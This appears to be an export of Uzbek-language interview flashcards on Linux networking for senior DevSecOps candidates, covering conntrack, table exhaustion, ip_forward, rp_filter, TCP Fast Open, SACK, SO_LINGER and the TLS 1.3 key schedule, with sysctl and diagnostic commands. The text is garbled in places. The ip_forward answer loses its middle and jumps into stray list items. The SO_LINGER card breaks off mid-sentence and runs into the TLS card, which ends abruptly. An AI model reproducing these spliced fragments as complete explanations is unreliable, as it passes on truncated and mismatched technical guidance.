Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42015	<p><code>conntrack</code> (connection tracking) nima?</p>	<p><b>Qisqa javob:</b> conntrack (Netfilter connection tracking) — kernel'ning har oqim (TCP, UDP, ICMP) holatini kuzatadigan quyi tizimi: <code>NEW</code>, <code>ESTABLISHED</code>, <code>RELATED</code>, <code>INVALID</code>. Stateful firewall (<code>-m state --state ESTABLISHED</code>), NAT (SNAT/DNAT — javob paketini qayta tarjima qilish) va kube-proxy'ning iptables/IPVS rejimidagi Service'lari shunga tayanadi.</p><p><b>Muammo:</b> NAT qilingan paketning <b>javobi</b> qaytganda kernel uni qaysi ichki IP'ga qaytarishni qayerdan biladi? Yoki firewall &quot;faqat ichkaridan boshlangan ulanishlarga javobni o't&quot; — buning uchun ulanish tarixini eslab qolish kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>pod 10.244.1.5:40000 -&gt; Service 10.96.0.10:53 (ClusterIP)<br>  iptables DNAT -&gt; 10.244.2.8:53 ; conntrack yozuvi:<br>  udp src=10.244.1.5 dst=10.96.0.10 sport=40000 dport=53<br>      src=10.244.2.8 dst=10.244.1.5 sport=53 dport=40000   [ASSURED]<br>Javob paketi -&gt; conntrack topadi -&gt; manba 10.96.0.10 ga qayta yoziladi -&gt; pod<br>Har yozuv timeout bilan: TCP established 5 kun (default 432000s), UDP 30-120s</pre><p><b>Amalda:</b></p><pre>conntrack -L | head                    # yozuvlar (conntrack-tools)<br>conntrack -L -d 10.96.0.10 -p udp<br>conntrack -S                           # statistika: insert_failed, drop, early_drop<br>cat /proc/sys/net/netfilter/nf_conntrack_count /proc/sys/net/netfilter/nf_conntrack_max<br>conntrack -D -d 10.96.0.10             # eski yozuvlarni tozalash (masalan endpoint o'zgargach)</pre><p><b>Tuzoqlar:</b></p><ul><li>UDP Service backend'i o'zgarsa eski conntrack yozuvi trafikni o'lik pod'ga yuboradi (kube-proxy tozalaydi, lekin bug'lar bo'lgan).</li><li>DNS race: glibc A va AAAA so'rovlarini bitta socket'dan parallel yuboradi -&gt; conntrack <code>insert_failed</code> -&gt; 5 soniyalik DNS kechikishi (K8s'dagi mashhur muammo; <code>single-request-reopen</code> yoki NodeLocal DNSCache).</li><li>Yuqori RPS'li servislarda conntrack o'zi CPU va xotira yeydi — ba'zan <code>NOTRACK</code> (raw jadval) bilan chetlab o'tiladi.</li></ul><p><b>Senior nuqta:</b> &quot;Ba'zan paket yo'qoladi&quot; muammolarining katta qismi conntrack bilan bog'liq: <code>conntrack -S</code> dagi <code>insert_failed</code>/<code>drop</code> hisoblagichlarini monitoringga qo'shing (node_exporter <code>node_nf_conntrack_*</code>).</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42016	<p>Conntrack jadvali to'lib qolishi nima?</p>	<p><b>Qisqa javob:</b> Conntrack jadvali to'lganda (<code>nf_conntrack_count</code> = <code>nf_conntrack_max</code>) kernel <b>yangi</b> ulanishlar uchun yozuv yarata olmaydi va paketlarni jim tashlaydi; <code>dmesg</code>da: <code>nf_conntrack: nf_conntrack: table full, dropping packet</code>. Simptomlar: tasodifiy timeout'lar, DNS xatolari, yangi ulanishlar ochilmaydi, mavjudlari ishlaydi.</p><p><b>Muammo (tipik sabablar):</b></p><ul><li>Juda ko'p qisqa ulanish (keep-alive yo'q, har so'rovga yangi TCP).</li><li>DDoS/SYN flood yoki port skaner.</li><li>Uzun timeout'lar: TCP established default 5 kun — yarim yopilgan ulanishlar jadvalni band qiladi.</li><li>K8s node'da ko'p DNS (UDP) so'rovlar, NodePort/LB trafik.</li></ul><p><b>Qanday ishlaydi:</b></p><pre>paket (NEW) -&gt; conntrack: count &lt; max ?<br>                 ha  -&gt; yozuv yaratish -&gt; davom<br>                 yo'q -&gt; early_drop (eski unassured yozuvni o'chirishga urinish)<br>                         muvaffaqiyatsiz -&gt; DROP + &quot;table full&quot; log</pre><p><b>Amalda (diagnostika va yechim):</b></p><pre>dmesg -T | grep -i conntrack<br>sysctl net.netfilter.nf_conntrack_count net.netfilter.nf_conntrack_max<br>conntrack -S | grep -E 'drop|early_drop|insert_failed'<br>conntrack -L -o extended | awk '{print $3}' | sort | uniq -c     # protokol bo'yicha<br># vaqtinchalik oshirish (har yozuv ~300 bayt RAM)<br>sysctl -w net.netfilter.nf_conntrack_max=1048576<br>echo 262144 &gt; /sys/module/nf_conntrack/parameters/hashsize       # max/4 atrofida<br>sysctl -w net.netfilter.nf_conntrack_tcp_timeout_established=86400<br>sysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait=30</pre><p>K8s: kube-proxy <code>--conntrack-max-per-core</code>, <code>--conntrack-min</code>; DNS uchun NodeLocal DNSCache (UDP conntrack'ni kamaytiradi).</p><p><b>Tuzoqlar:</b></p><ul><li>Faqat <code>max</code>ni oshirib <code>hashsize</code>ni o'zgartirmaslik — hash zanjirlari uzayadi, CPU oshadi.</li><li>Sabab (ulanishlarni qayta ishlatmaslik, flood) tuzatilmasa — limit yana to'ladi.</li><li>Monitoring'siz qolish: Prometheus <code>node_nf_conntrack_entries / node_nf_conntrack_entries_limit &gt; 0.8</code> alert qo'ying.</li></ul><p><b>Senior nuqta:</b> Conntrack to'lishi — klassik &quot;jim&quot; outage: CPU, xotira normal, lekin ulanishlar yo'qoladi. Har node'da foiz alert'i va post-mortem'da asosiy sababni (ko'pincha keep-alive yo'qligi) tuzatish shart.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42017	<p><code>net.ipv4.ip_forward=1</code> nima?</p>	<p><b>Qisqa javob:</b> <code>net.ipv4.ip_forward=1</code> — Linux host'ga bir interfeysdan kelgan, <b>o'ziga mo'ljallanmagan</b> paketlarni boshqa interfeysga yo'naltirishga (router kabi ishlashga) ruxsat beradi. FORWARD default policy'ni <code>DROP</code> qilib, faqat kerakli oqimlarga ruxsat bering.</li><li>Oddiy server (web, DB) uchun <code>ip_forward=0</code> qoldiring — kamroq hujum yuzasi.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Docker/firewalld/boshqa servis reboot'dan keyin qiymatni o'zgartiradi — doimiy konfiguratsiya va tekshiruv kerak.</li><li>IPv6 forwarding alohida — dual-stack klasterda IPv6 trafik ishlamaydi.</li><li><code>ip_forward=1</code>, lekin FORWARD chain DROP — &quot;forwarding yoqiq, baribir ishlamayapti&quot;.</li></ul><p><b>Senior nuqta:</b> Node &quot;pod'lar tashqariga chiqmayapti&quot; debug ketma-ketligi: <code>ip_forward</code> -&gt; FORWARD chain -&gt; NAT (MASQUERADE) -&gt; route -&gt; cloud security group/source-dest check (AWS'da ENI'da <code>SourceDestCheck</code> o'chirilishi kerak bo'lishi mumkin).</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42018	<p>Reverse path filtering (<code>rp_filter</code>) nima?</p>	<p><b>Qisqa javob:</b> Reverse path filtering (<code>rp_filter</code>) — kiruvchi paketning <b>manba IP</b>'siga javob shu interfeys orqali qaytishini routing jadvalidan tekshiradi. Mos kelmasa paket tashlanadi — IP spoofing'ga qarshi himoya (RFC 3704). Qiymatlar: <code>0</code> — o'chiq, <code>1</code> — <b>strict</b> (javob aynan shu interfeysdan bo'lishi kerak), <code>2</code> — <b>loose</b> (istalgan interfeys orqali manbaga yo'l bo'lsa yetarli).</p><p><b>Muammo:</b> Hujumchi tashqi interfeysdan manba IP'si ichki <code>10.0.0.5</code> bo'lgan soxta paket yuboradi — firewall uni &quot;ichki&quot; deb o'tkazishi mumkin. Strict rp_filter buni bloklaydi: <code>10.0.0.5</code> ga route ichki interfeys orqali, paket esa tashqi interfeysdan keldi.</p><p><b>Qanday ishlaydi:</b></p><pre>paket eth1 dan keldi, src=10.0.0.5<br>routing lookup: 10.0.0.5 ga qaysi interfeys orqali? -&gt; eth0<br>strict (1): eth0 != eth1 -&gt; DROP<br>loose  (2): 10.0.0.5 ga biror yo'l bormi? ha -&gt; qabul<br>Effektiv qiymat = max(conf.all, conf.&lt;iface&gt;)</pre><p><b>Amalda:</b></p><pre>sysctl -a 2&gt;/dev/null | grep '\.rp_filter'<br>sysctl -w net.ipv4.conf.all.rp_filter=2<br>sysctl -w net.ipv4.conf.eth1.rp_filter=2<br>sysctl -w net.ipv4.conf.all.log_martians=1     # tashlanganlarni log'ga<br>dmesg | grep -i martian                         # &quot;martian source 10.0.0.5 from ..., on dev eth1&quot;<br>nstat -az | grep IPReversePathFilter            # hisoblagich</pre><p><b>Tuzoqlar:</b></p><ul><li><b>Asimmetrik routing</b> (ikki NIC, multi-homed server, policy routing, ba'zi CNI va VPN'lar): javob boshqa interfeysdan ketadi — strict rejim <b>legit</b> trafikni tashlaydi. Klassik &quot;ikkinchi NIC qo'shdik — ulanishlar yo'qoldi&quot;. Yechim: <code>loose</code> (2).</li><li><code>all</code> va interfeys qiymati — <code>max</code> olinadi: <code>all=1</code> bo'lsa interfeysda <code>0</code> qo'yish yordam bermaydi.</li><li>Cilium/Calico eBPF va ba'zi tunnel interfeyslar o'z <code>rp_filter</code> sozlamalarini talab qiladi — CNI hujjatini tekshiring (systemd 245+ default <code>2</code> qo'yadi, ba'zi CNI'lar bilan to'qnash kelgan).</li></ul><p><b>Senior nuqta:</b> Spoofing'ga qarshi asosiy himoya — chegarada (edge) ingress filtering (BCP 38); host darajasida <code>loose</code> rejim ko'p muhitlarda xavfsizlik va moslik o'rtasidagi to'g'ri balans.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42019	<p>TCP Fast Open (xavfsizlik/tarmoq kontekstida) nima?</p>	<p><b>Qisqa javob:</b> TCP Fast Open (TFO, RFC 7413) — oldin ulangan client server bergan <b>TFO cookie</b>ni saqlaydi va keyingi ulanishda ma'lumotni (masalan HTTP so'rov) to'g'ridan-to'g'ri <b>SYN paket ichida</b> yuboradi. Server cookie'ni tekshirib, handshake tugashini kutmasdan ilovaga ma'lumot beradi — 1 RTT tejaladi.</p><p><b>Muammo:</b> Qisqa so'rovlar (API, DNS over TCP) uchun TCP handshake kechikishning katta qismi: RTT 150 ms bo'lsa — har yangi ulanishga +150 ms faqat &quot;salomlashish&quot;ga.</p><p><b>Qanday ishlaydi:</b></p><pre>1-ulanish:  SYN (TFO cookie request) --&gt;<br>            &lt;-- SYN-ACK (cookie = MAC(client IP, server secret))<br>            client cookie'ni saqlaydi<br>Keyingi:    SYN + cookie + DATA(&quot;GET /&quot;) --&gt;   server: cookie to'g'rimi? -&gt; ilovaga DATA darhol<br>            &lt;-- SYN-ACK + javob ma'lumoti<br>Cookie IP'ga bog'langan -&gt; boshqa IP'dan soxta SYN+data qabul qilinmaydi</pre><p><b>Amalda:</b></p><pre>sysctl net.ipv4.tcp_fastopen          # 1=client, 2=server, 3=ikkalasi<br>sysctl -w net.ipv4.tcp_fastopen=3<br>nstat -az | grep -i fastopen          # TcpExtTCPFastOpenPassive, ...Fail</pre><pre>listen 443 ssl fastopen=256;          # navbat uzunligi</pre><p>Client: <code>curl --tcp-fastopen https://example.com</code>.</p><p><b>Xavfsizlik konteksti:</b></p><ul><li><b>Replay:</b> SYN ichidagi ma'lumot tarmoqda qayta yuborilishi (dublikat SYN) mumkin — server uni ikki marta qayta ishlashi mumkin. Faqat <b>idempotent</b> so'rovlar (GET) uchun xavfsiz (TLS 1.3 0-RTT bilan bir xil muammo).</li><li><b>Amplification/resource</b>: cookie tekshirilgunga qadar server resurs sarflaydi — <code>fastopen</code> navbat limiti shu uchun.</li><li>Kuzatish: cookie client'ni qayta identifikatsiya qilishi mumkin (privacy).</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Ko'p middlebox'lar (firewall, NAT) SYN'dagi ma'lumotli paketlarni tashlaydi — client fallback qiladi, foyda yo'q yoki kechikish. Shu sabab brauzerlar TFO'ni amalda o'chirgan.</li><li>Server ilovasi TFO'ni qo'llashi kerak (<code>TCP_FASTOPEN</code> socket opsiyasi), sysctl yolg'iz yetmaydi.</li></ul><p><b>Senior nuqta:</b> Amalda TFO o'rnini <b>TLS 1.3 + HTTP/3 (QUIC 0-RTT)</b> va connection reuse egalladi. Ichki DC'da (middlebox yo'q) foydali bo'lishi mumkin, lekin keep-alive odatda kattaroq yutuq.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42020	<p>TCP SACK (tarmoq kontekstida) nima?</p>	<p><b>Qisqa javob:</b> SACK (Selective Acknowledgment, RFC 2018) — qabul qiluvchi ACK'da &quot;mana bu diapazonlarni ham oldim&quot; (masalan <code>SACK 3001-5000, 6001-8000</code>) deb aytadigan TCP opsiyasi. Yuboruvchi faqat haqiqatan <b>yo'qolgan</b> segmentlarni qayta yuboradi, butun oynani emas. Handshake'da <code>SACK_PERM</code> bilan kelishiladi; Linux'da default yoqilgan.</p><p><b>Muammo:</b> Oddiy kumulyativ ACK faqat &quot;N baytgacha hammasini oldim&quot; deydi. 64 KB oynada 2-segment yo'qolsa, qabul qiluvchi qolgan 40 segmentni olgan bo'lsa ham, yuboruvchi buni bilmaydi va (Go-Back-N uslubida) ko'p narsani qayta yuboradi yoki har yo'qotishni bitta-bitta RTT bilan topadi. Yo'qotishli, uzoq link'larda throughput keskin tushadi.</p><p><b>Qanday ishlaydi:</b></p><pre>Yuborildi: [1][2][3][4][5][6]<br>Yo'qoldi:     [2]      [5]<br>ACK'lar:   ACK=2 (1 keldi)  SACK: 3-4    keyin SACK: 3-4, 6<br>Yuboruvchi: faqat [2] va [5] ni qayta yuboradi -&gt; ACK=7<br>D-SACK: dublikat kelganini bildiradi -&gt; keraksiz retransmit'larni aniqlash</pre><p><b>Amalda:</b></p><pre>sysctl net.ipv4.tcp_sack net.ipv4.tcp_dsack        # 1<br>ss -ti dst 10.0.0.5 | grep -oE 'sack|retrans:[0-9/]+|lost:[0-9]+'<br>nstat -az | grep -iE 'SACK|Retrans'<br>tcpdump -ni eth0 'tcp[tcpflags] &amp; tcp-ack != 0' -vv | grep -i sack</pre><p>Wireshark: <code>tcp.options.sack_le</code>, &quot;TCP Dup ACK&quot; + SACK bloklari.</p><p><b>Xavfsizlik/tarmoq konteksti:</b></p><ul><li><b>SACK Panic (CVE-2019-11477)</b> — maxsus SACK ketma-ketligi Linux kernel'ni panic qildirgan; vaqtinchalik yechim <code>tcp_sack=0</code> edi. Bugun patch qilingan kernel'larda SACK'ni o'chirish <b>tavsiya qilinmaydi</b> — performance yomonlashadi.</li><li>Ba'zi eski firewall'lar sequence randomization qilib SACK bloklarini o'zgartirmaydi -&gt; buzilgan SACK -&gt; ulanish sekinlashadi. Firewall'da &quot;TCP sequence randomization&quot;ni tekshiring.</li></ul><p><b>Tuzoqlar:</b></p><ul><li>Performance muammosida &quot;SACK'ni o'chirib ko'ramiz&quot; — deyarli doim yomonroq natija.</li><li>Retransmit ko'p bo'lsa SACK'ni emas, yo'qotish manbasini (MTU, navbat, NIC drop) qidiring.</li></ul><p><b>Senior nuqta:</b> SACK zamonaviy loss recovery'ning (RACK-TLP, BBR) asosi. Uni o'chirish faqat tasdiqlangan zaiflikka qarshi vaqtinchalik chora bo'lishi mumkin — keyin kernel'ni yangilang va qayta yoqing.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography

Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42022	<p><code>SO_LINGER</code> nima?</p>	<p><b>Qisqa javob:</b> <code>SO_LINGER</code> — <code>close()</code> chaqirilganda socket buferida qolgan ma'lumot bilan nima qilishni belgilaydi: <code>l_onoff=1, l_linger=N</code> — N soniyagacha yuborilishini kutib bloklaydi; <code>l_linger=0</code> — ma'lumotni tashlab darhol <b>RST</b> yuboradi (TIME_WAIT bo'lmaydi).</p><p><b>Muammo:</b> Load tester yoki proxy sekundiga minglab qisqa ulanish ochadi, <code>TIME_WAIT</code> socket'lar portlarni tugatadi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42023	<p>TLS 1.3 key schedule nima?</p>	<p><b>Qisqa javob:</b> TLS 1.3 key schedule — bitta umumiy sirdan (ECDHE va/yoki PSK) <b>HKDF-Extract/Expand</b> orqali bosqichma-bosqich alohida kalitlar chiqarish zanjiri: early secret → handshake secret → master secret, har biridan client/server uchun alohida traffic kaliti.</p><p><b>Nega kerak:</b> TLS 1.2 da bitta <code>master_secret</code> dan hamma kalit PRF bilan olinardi va handshake shifrlanmagandi. 1.3 da maqsad: handshake'ning o'zi shifrlangan bo'lsin, har bosqich kaliti mustaqil bo'lsin, va transcript (barcha xabarlar hash'i) kalitga bog'lansin — xabarni o'zgartirsa kalit ham buziladi (downgrade/MitM'ga qarshi).</p><p><b>Qanday ishlaydi:</b></p><pre>PSK (yoki 0) --HKDF-Extract--&gt; Early Secret --&gt; 0-RTT kalit (early data)<br>                                   |<br>             (EC)DHE shared  --Extract--&gt; Handshake Secret<br>                                   |      --&gt; c/s handshake traffic keys<br>                                   |          (Certificate, Finished shifrlangan)<br>                         0  --Extract--&gt; Master Secret<br>                                          --&gt; c/s application traffic keys<br>                                          --&gt; resumption secret, exporter<br>Har Expand: HKDF-Expand-Label(secret, &quot;c hs traffic&quot;, Hash(transcript))</pre><p><b>Amalda:</b></p><pre>SSLKEYLOGFILE=/tmp/keys.log curl https://example.com   # debug uchun kalitlarni yozish<br># Wireshark: TLS -&gt;
